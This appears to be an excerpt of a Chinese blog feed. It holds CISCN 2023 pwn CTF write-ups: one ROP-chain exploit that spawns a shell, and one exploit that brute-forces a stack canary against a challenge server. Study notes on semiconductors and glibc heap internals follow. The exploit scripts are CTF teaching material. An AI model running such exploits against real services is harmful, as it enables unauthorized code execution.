p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半导体基础</title>
      <link href="/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/"/>
      <url>/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>模电我真的好喜欢你啊啊啊:heart_eyes:</p></blockquote><h1 id="二极管"><a href="#二极管" class="headerlink" title="二极管"></a>二极管</h1><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526210931337.png" alt="image-20230526210931337"><br>$$<br>i&#x3D;I_s(e^{\frac{u}{U_T}}-1),常温下U_T&#x3D;26mV<br>$$</p><h2 id="等效电路"><a href="#等效电路" class="headerlink" title="等效电路"></a>等效电路</h2><p><strong>大信号模型：</strong></p><ul><li>理想二极管</li><li>理想二极管串一个反向的$U_{ON}$电压源</li></ul><p><strong>小信号模型（静态点附近）：</strong></p><ul><li>动态电阻$r_d&#x3D;\frac{\Delta u_D}{\Delta i_D}\approx\frac{U_T}{I_D}$</li></ul><h2 id="主要参数"><a href="#主要参数" class="headerlink" title="主要参数"></a>主要参数</h2><ul><li><p>最大整流电流$I_F$：平均</p></li><li><p>最大反向工作电压$U_R$：瞬时</p></li><li><p>反向电流$I_R(I_S)$ </p></li><li><p>最高工作频率$f_M$：PN结有电容效应</p></li></ul><h2 id="稳压二极管"><a href="#稳压二极管" class="headerlink" title="稳压二极管"></a>稳压二极管</h2><p>dddd</p><h1 id="晶体三极管Triode"><a href="#晶体三极管Triode" class="headerlink" title="晶体三极管Triode"></a>晶体三极管Triode</h1><p>:cry:</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211007779.png" alt="image-20230526211007779"></p><h2 id="放大作用"><a href="#放大作用" class="headerlink" title="放大作用"></a>放大作用</h2><h3 id="放大条件"><a href="#放大条件" class="headerlink" title="放大条件"></a>放大条件</h3><ol><li>$U_{BE}&gt;U_{on}$，发射结正偏</li><li>$U_{CB}\geq0$，即$U_{CE}\geq U_{BE}$，集电结反偏</li></ol><h3 id="电流分配"><a href="#电流分配" class="headerlink" title="电流分配"></a>电流分配</h3><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211012892.png" alt="image-20230526211012892"><br>$$<br>I_E&#x3D;I_B+I_C<br>$$<br>共射电流放大系数：<br>$$<br>\beta\approx\frac{I_C}{I_B}<br>$$<br>共基极电流放大系数：<br>$$<br>\alpha&#x3D;\frac{I_C}{I_E}<br>$$</p><h2 id="输入输出特性"><a href="#输入输出特性" class="headerlink" title="输入输出特性"></a>输入输出特性</h2><h3 id="输入特性"><a href="#输入特性" class="headerlink" title="输入特性"></a>输入特性</h3><p>$$<br>i_B&#x3D;f(u_{BE})\Big |<em>{U</em>{CE}}<br>$$</p><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211018315.png" alt="image-20230526211018315"></p><h2 id="输出特性"><a href="#输出特性" class="headerlink" title="输出特性"></a>输出特性</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211022975.png" alt="image-20230526211022975"></p><h3 id="截止区"><a href="#截止区" class="headerlink" title="截止区"></a>截止区</h3><p>$$<br>u_{BE}&lt;U_{on},u_{BC}&lt;U_{on}<br>$$</p><h3 id="放大区"><a href="#放大区" class="headerlink" title="放大区"></a>放大区</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}&lt;U_{on}<br>$$</p><p>$$<br>i_C&#x3D;\beta i_B,\Delta i_C&#x3D;\beta\Delta i_B<br>$$</p><p>输出回路电流$i_C$几乎仅仅取决于输入回路电流$i_B$，可等效为<strong>受控电流源</strong></p><h3 id="饱和区"><a href="#饱和区" class="headerlink" title="饱和区"></a>饱和区</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}\geq U_{on}<br>$$</p><p>失去控制作用，饱和导通状态</p><h1 id="MOSFET"><a href="#MOSFET" class="headerlink" title="MOSFET"></a>MOSFET</h1><h1 id="MOSFET放大电路"><a href="#MOSFET放大电路" class="headerlink" title="MOSFET放大电路"></a>MOSFET放大电路</h1><h2 id="MOSFET小信号分析"><a href="#MOSFET小信号分析" class="headerlink" title="MOSFET小信号分析"></a>MOSFET小信号分析</h2><p>$$<br>I_D&#x3D;\frac{K(V_I-V_{TH})^2}{2}<br>$$</p><p>$$<br>i_d&#x3D;K(V_I-V_{TH})v_i<br>$$</p><h3 id="小信号增益"><a href="#小信号增益" class="headerlink" title="小信号增益"></a>小信号增益</h3><p>$$<br>\bigg|\frac{v_o}{v_i}\bigg|&#x3D;K(V_I-V_T)R_L<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（三）——heap</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写的不好，有空再改</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure><h2 id="分配堆空间"><a href="#分配堆空间" class="headerlink" title="分配堆空间"></a>分配堆空间</h2><h3 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk&amp;sbrk"></a>brk&amp;sbrk</h3><p>main arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;<span class="comment">//*addr为数据段结束地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;<span class="comment">//返回操作前数据段结束地址</span></span><br></pre></td></tr></table></figure><p>开启ASLR后，BSS segment和heap间存在Random brk offset；关闭后，堆开始地址和数据段结束地址重合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">cat /proc/86231/maps</span><br></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>thread arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> fildes, <span class="type">off_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>第一次执行malloc</p><ul><li>size&gt;&#x3D;128kB<ul><li>mmap &#x3D;&gt; sys_mmap</li></ul></li><li>size&lt;128kB<ul><li>brk &#x3D;&gt; sys_brk</li></ul></li></ul><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>最小SIZE_T(ul)*4</p><p>chunk header(prev_size+size)+user data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>allocated chunk&#x2F;freed chunk:</p><ul><li>prev_size: 物理上连续，前不为空可复用</li><li>size:<ul><li>NON_MAIN_ARENA(<strong>A</strong>)</li><li>IS_MAPPED(<strong>M</strong>)</li><li>PREV_INUSE(<strong>P</strong>)</li></ul></li><li>fd,bk: linked list中，allocated chunk中复用</li><li>fd_nextsize,bk_nextsize: large chunk(不含bin)</li></ul><p>top chunk: </p><ul><li>prev_size</li><li>size: 剩下多少空间</li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221411859.png" alt="image-20230601221411859"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221609068.png" alt="image-20230601221609068"></p><p><img 